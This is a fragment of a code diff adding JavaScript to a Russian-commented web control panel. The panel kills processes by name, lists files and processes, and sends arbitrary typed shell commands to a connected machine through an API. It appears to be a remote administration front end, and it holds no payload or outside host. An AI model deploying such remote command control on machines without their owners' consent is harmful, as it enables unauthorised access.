+                sendCommand('processes');
+            }
+        }
+
+        async function killProcessByName() {
+            const name = document.getElementById('killName').value;
+            if (name) {
+                await apiRequest('/api/killbyname', 'POST', { name: name });
+                sendCommand('processes');
+            }
+        }
+
+        // ==================== КОМАНДЫ ====================
+        function runCustomCommand() {
+            const cmd = document.getElementById('customCmd').value;
+            if (cmd) {
+                sendCommand('cmd', { cmd: cmd });
+            }
+        }
+
+        function quickCmd(cmd) {
+            document.getElementById('customCmd').value = cmd;
+            runCustomCommand();
+        }
+
+        // ==================== ВКЛАДКИ ====================
+        function switchTab(tabName) {
+            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+            event.target.classList.add('active');
+            document.getElementById(`tab-${tabName}`).classList.add('active');
+            
+            // Загружаем данные при переключении
+            if (tabName === 'files') listFiles();
+            if (tabName === 'processes') sendCommand('processes');
+            if (tabName === 'dashboard') loadDashboard();
+        }
+
+        // Периодическая проверка соединения
+        setInterval(checkConnection, 10000);
     </script>
 </body>
 </html>
